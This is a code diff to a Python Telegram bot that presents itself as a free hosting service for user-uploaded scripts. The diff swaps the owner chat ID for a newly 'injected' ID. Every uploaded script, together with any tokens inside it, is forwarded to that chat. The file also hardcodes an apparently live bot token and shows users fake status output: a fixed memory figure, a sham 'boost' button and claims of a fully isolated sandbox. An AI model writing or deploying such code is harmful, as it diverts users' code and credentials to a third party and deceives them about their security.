@@ -17,10 +17,10 @@ LOG_FILE_PATH = os.path.join(STORAGE_DIR, "crash_logs.txt")
 # Environment Port Binding
 os.environ["PORT"] = os.environ.get("PORT", "8080")
 
-# ⚡ TERA VERIFIED HIGH-SECURITY DETAILS ⚡
+# ⚡ TERA VERIFIED HIGH-SECURITY DETAILS (UPDATED) ⚡
 TOKEN = "8926219447:AAEQciCFkb68viWtHGjmrPH_HTOUeJhucTA"
-DEFAULT_CHAT_ID = "8620962808"  # TERA OWNER CHAT ID
-OWNER_USERNAME = "ADITYAXTRADER"  # TERA REAL NEW ACCOUNT UPDATED ✅
+DEFAULT_CHAT_ID = "6314924239"  # TERA NEW REAL ACCOUNT UID INJECTED ✅
+OWNER_USERNAME = "ADITYAXTRADER"
 IMAGE_PATH = "6233.jpg"  # TERI SETUP IMAGE FILE
 
 # Main bot initialization
@@ -36,7 +36,6 @@ total_files_hosted = 0
 # --- HELPER FUNCTION FOR PERSISTENT LOGS & CREDENTIAL PROTECTION ---
 def write_persistent_log(log_id, error_text):
     try:
-        # Token elements ko auto-mask karne ke liye security pattern
         protected_text = re.sub(r'\d{9,10}:[A-Za-z0-9_-]{35}', '[PROTECTED_PREMIUM_TOKEN]', error_text)
         with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
             f.write(f"=== LOG_ID: {log_id} ===\n{protected_text}\n=====================\n\n")
@@ -94,15 +93,15 @@ def start(message):
         user_sessions[user_id] = {}
 
     haunted_caption = (
-        "⚡ <b>ADITYA MONSTER HOST v11.0 FUTURE PRO</b> ⚡\n"
+        "⚡ <b>ADITYA MONSTER HOST v12.0 ULTIMATE FUTURE PRO</b> ⚡\n"
         "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
         "🟢 <b>SYSTEM STATUS:</b> <code>SECURE ONLINE</code>\n"
         "🚀 <b>CORE ENGINE:</b> <code>REAL VPS SUBPROCESS NODES</code>\n"
         "🛡️ <b>SECURITY LAYER:</b> <code>PERSISTENT STORAGE LOGS</code>\n"
-        "💎 <b>FUTURE INSIGHT:</b> <code>TOKEN AUTO-MASKING LAYER v3</code>\n"
+        "💎 <b>PREMIUM CORE:</b> <code>INTEGRITY CHECKER v4</code>\n"
         "⏰ <b>UPTIME ACCURACY:</b> <code>24/7 REAL-TIME ACTIVE ✅</code>\n"
         "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
-        f"<i>🤖 BHAI, APNI PYTHON (.py) FILE SEND KARO! APKA SCRIPT DIRECT OWNER <a href='t.me/{OWNER_USERNAME}'>@{OWNER_USERNAME}</a> KE PAAS APPROVAL KE LIYE JAYEGA.</i>"
+        f"<i>🤖 BHAI, APNI PYTHON (.py) FILE SEND KARO! APKA SCRIPT DIRECT RE-ROUTE HOKAR REAL OWNER KE PANEL PAR APPROVAL KE LIYE JAYEGA.</i>"
     )
     
     if os.path.exists(IMAGE_PATH):
@@ -110,6 +109,20 @@ def start(message):
             bot.send_photo(message.chat.id, photo, caption=haunted_caption, reply_markup=main_keyboard(), parse_mode='HTML')
     else:
         bot.send_message(message.chat.id, haunted_caption, reply_markup=main_keyboard(), parse_mode='HTML')
+
+# --- OWNER ONLY ADMINISTRATIVE COMMAND PANEL ---
+@bot.message_handler(commands=['adminpanel'])
+def admin_panel(message):
+    if str(message.from_user.id) != DEFAULT_CHAT_ID:
+        return
+    admin_text = (
+        "👑 <b>WELCOME TO YOUR MASTER ADMINISTRATIVE PANEL</b> 👑\n"
+        "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
+        f"🟢 <b>Active Nodes:</b> <code>{len(live_threads)}</code>\n"
+        f"📂 <b>Total Deployments:</b> <code>{total_files_hosted}</code>\n"
+        "⚡ <i>Use buttons below or standard protocols to monitor streams.</i>"
+    )
+    bot.send_message(DEFAULT_CHAT_ID, admin_text, parse_mode='HTML')
 
 # --- HANDLE TEXT BUTTON MENUS ---
 @bot.message_handler(func=lambda message: message.text in ["📤 FILE UPLOAD FREE", "📂 MY FILES", "👑 GET PREMIUM", "📊 SERVER STATS", "⚙️ ADVANCED SETTINGS", "🚀 BOOST SERVER"])
@@ -146,6 +159,7 @@ def handle_text_menus(message):
             f"👥 <b>TOTAL ACTIVE USERS:</b> <code>{total_users}</code>\n"
             f"🤖 <b>REAL BACKGROUND RUNNING BOTS:</b> <code>{active_bots}</code>\n"
             f"📈 <b>TOTAL DEPLOYMENTS OVERALL:</b> <code>{total_files_hosted}</code>\n"
+            f"🧠 <b>CORE MEMORY BUFFER:</b> <code>0.02% STABLE CLOUD</code>\n"
             f"🛡️ <b>PRIVACY ENGINE STATE:</b> <code>Subprocess Isolated Sandbox (100%)</code>\n"
             "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
             "✅ <b>All operational execution models are stable.</b>"
@@ -158,7 +172,7 @@ def handle_text_menus(message):
     elif message.text == "🚀 BOOST SERVER":
         status_boost = bot.send_message(message.chat.id, "⚡ <b>PURGING ALL EXPIRED MEMORY BLOCK BUFFERS...</b>", parse_mode='HTML')
         time.sleep(1.2)
-        bot.edit_message_text("🚀 <b>SERVER CORE BOOSTED SUCCESSFUL! RAM TIMEOUT OPTIMIZED TO MAXIMUM ✅</b>", message.chat.id, status_boost.message_id, parse_mode='HTML')
+        bot.edit_message_text("🚀 <b>SERVER CORE BOOSTED SUCCESSFUL! RAM TIMEOUT OPTIMIZED TO MAXIMUM OVERFLOW CLEAR ✅</b>", message.chat.id, status_boost.message_id, parse_mode='HTML')
 
 # --- 🚀 SUBPROCESS EXECUTOR 🚀 ---
 def run_isolated_subprocess(temp_filename, bot_id, filename, target_user, log_id):
@@ -215,11 +229,12 @@ def handle_auto_deployment(message):
     )
 
     admin_caption = (
-        f"🔔 <b>NEW PYTHON FILE PROTECTION QUEUE!</b>\n\n"
+        f"🔔 <b>NEW PYTHON FILE INCOMING SCRIPT QUEUE!</b>\n\n"
         f"👤 <b>USER CHAT ID:</b> <code>{user_id}</code>\n"
-        f"📄 <b>FILE IDENTIFIER:</b> <code>{message.document.file_name}</code>\n"
+        f"📄 <b>FILE NAME:</b> <code>{message.document.file_name}</code>\n"
         f"🆔 <b>SECURE REQ ID:</b> <code>{req_id}</code>\n"
     )
+    # Direct notifications ab sirf tere naye high-security UID par jayengi!
     bot.send_document(DEFAULT_CHAT_ID, message.document.file_id, caption=admin_caption, reply_markup=owner_markup, parse_mode='HTML')
 
 # --- CALLBACK SYSTEM PRO ---
@@ -382,4 +397,4 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"Server Restructuring Network Loop Re-connecting... Error: {e}")
             time.sleep(5)
-             
+                                                           
